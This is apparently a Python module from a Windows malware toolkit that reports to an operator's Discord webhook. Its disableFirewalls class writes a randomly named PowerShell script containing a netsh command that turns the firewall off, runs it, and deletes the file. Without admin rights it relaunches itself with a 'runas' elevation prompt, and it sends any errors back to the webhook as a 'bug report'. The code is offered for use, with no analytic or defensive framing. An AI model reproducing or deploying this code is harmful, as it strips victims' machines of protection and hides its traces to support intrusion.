import _random_string
import os
import time
import subprocess
import ctypes
import sys
from sys import argv
from dhooks import Embed
from config import Config
from __webhook import _WebhookX

class disableFirewalls():
    def send_error_notification(self, exception):
        cc = Config()
        webx = _WebhookX().get_object()

        embed = Embed(
            description='Error while disabling windows firewalls',
            color=16399677,
            timestamp='now'
        )

        embed.set_author(name=cc.get_name(), icon_url=cc.get_avatar())
        embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
        embed.add_field(name="Couldn't disable windows firewalls | Help us by reporting this bug",
                        value=f'Advanced Log: ```{exception}```')

        webx.send(embed=embed)
        
    def disable_windows_firewalls(self):
        isadmin = ctypes.windll.shell32.IsUserAnAdmin()
        if isadmin:
            _random_string.get_random_string(5)
            fname = f'disableFirewalls_{_random_string.result_str}.ps1'
            try:
                with open(fname, 'w') as f:
                    f.write('netsh advfirewall set domainprofile state off')
                    subprocess.run(fname, shell=True)

                os.remove(fname)
            except Exception as e:
                self.send_error_notification(e)
        if not isadmin:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            return